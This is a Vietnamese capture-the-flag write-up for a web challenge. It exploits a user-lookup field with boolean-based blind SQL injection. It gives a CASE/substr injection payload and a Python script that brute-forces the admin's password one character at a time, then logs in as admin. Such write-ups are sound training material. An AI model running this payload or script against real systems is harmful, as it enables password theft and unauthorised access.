# Task
![](https://hackmd.io/_uploads/Ska3BLffp.png)

## Recon
Ngay khi vừa mở challenge lên thì ta có một giao diện cho phép người dùng nhập vào đó là ```uid``` và trang web sẽ tìm xem người dùng với uid đó có tồn tại không 
![](https://hackmd.io/_uploads/HJNUUIMGa.png)
Nhưng nếu như ta nhập vào là admin thì sẽ ra kết quả khác
![](https://hackmd.io/_uploads/BJMcUUfzp.png)

## Exploit
Nhiệm vụ của chúng ta là tìm được password của admin và đăng nhập thành công vậy làm thế nào để có thể lấy được password của admin ở cột ```upw``` đây ta sẽ sử dụng payload như sau

```sql=
admin' AND (SELECT CASE WHEN substr(upw, 1, 1) = 'c' then (select 1 from users where uid ='admin') else (select 1 from users where uid = '1') END FROM users WHERE uid='admin') --/*
```
Giải thích đầu tiên là nhập vào đó là chữ admin để hoàn thành câu lệnh sql và thêm vào đó điều kiện là cắt chuỗi ở cột ```upw``` nếu như chữ cái đầu là chữ 'c' thì thực hiện câu lệnh ```select 1 from users where uid = 'admin'``` nếu không thì thực hiện câu lệnh ```select 1 from users where uid = '1'``` tại sao lại cần phải như thế là do ta có thể sử dụng dòng thông báo nếu như có tồn tại thì thông báo nếu không thì in ra thông báo không tìm thấy đây sẽ là điệu kiện để ta có thể biết rằng câu lệnh đã thành công hay chưa

Để đẩy nhanh tiến trình bruteforce mình có viết một đoạn script bằng python để hỗ trợ
```python=
import requests
import string
alphabet = "abcdefghjhijklmnopqrstuvwxyz0123456789_"
url = "http://18.141.217.137:32056"
payload = ""
headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36"}
for i in range (1, 100):
    for char in alphabet:
        data = {
            "uid" : f"admin' AND (SELECT CASE WHEN substr(upw, 1, {i}) = '{payload + char}' then (select 1 from users where uid ='admin') else (select 1 from users where uid = '1') END FROM users WHERE uid='admin') --/*"
        }
        response = requests.get(url=url, headers=headers, params=data)
        if ("exists" in response.text):
            payload += char
            print("password is: " + payload)
            break


```
![image alt](https://scontent.fhan5-11.fna.fbcdn.net/v/t1.15752-9/394545513_3018486608285249_1568288228069427033_n.png?_nc_cat=100&ccb=1-7&_nc_sid=8cd0a2&_nc_ohc=vco85FWhs-4AX87iNsh&_nc_ht=scontent.fhan5-11.fna&oh=03_AdS7UQUmjN5WyCDuJE8UCgWv8fObFEhjTfh0YiPRT0uOBg&oe=655C37E9)
Đăng nhập vào với username là ```admin``` và password vừa mới tìm được thôi

## Flag

![image alt](https://scontent.fhan5-6.fna.fbcdn.net/v/t1.15752-9/395007852_1316189552363083_6640319045436703742_n.png?_nc_cat=105&ccb=1-7&_nc_sid=8cd0a2&_nc_ohc=Mo1ZuJyQTlAAX847pIX&_nc_ht=scontent.fhan5-6.fna&oh=03_AdQYqhqCRCtTatWiZYmPJHT3Dy0QFIA57y2JQMjiPBXelw&oe=655C5B7B)
